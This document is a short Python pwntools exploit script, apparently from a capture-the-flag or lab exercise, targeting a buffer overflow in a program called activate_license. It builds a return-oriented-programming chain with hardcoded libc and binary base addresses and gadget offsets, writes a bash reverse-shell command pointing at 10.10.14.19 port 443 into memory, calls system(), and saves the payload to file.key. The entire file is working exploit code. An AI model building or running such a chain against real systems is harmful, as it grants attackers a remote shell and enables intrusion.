#!/usr/bin/python3


from pwn import *
import requests
import sys
from pprint import pprint



def bof():
    activate_license_base = 0x561c01940000
    libc_base = 0x7f5b12c77000
    writable = activate_license_base + 0x00004000
    offset = 520
    system = p64(libc_base + 0x00048e50)
    cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'"
    
    rop = b''
    rop += b"A"*offset

    # rdi, rsi, rdx, rcx, r8, r9
    # rdi 026796
    pop_rdi = p64(libc_base + 0x00026796)
    pop_rsi = p64(libc_base + 0x0002890f)
    mv_rdi_rsi = p64(libc_base + 0x000603b2)


    for x in range(0, len(cmd), 8):
        rop += pop_rdi
        rop += p64(writable + x)
        rop += pop_rsi
        rop += cmd[x:x+8].ljust(8, b'\x00')
        rop += mv_rdi_rsi

    rop += pop_rdi
    rop += p64(writable)
    rop += system

    with open("file.key", 'wb') as file:
        file.write(rop)


def main():
    # try:
    bof()



if __name__ == "__main__":
    main()
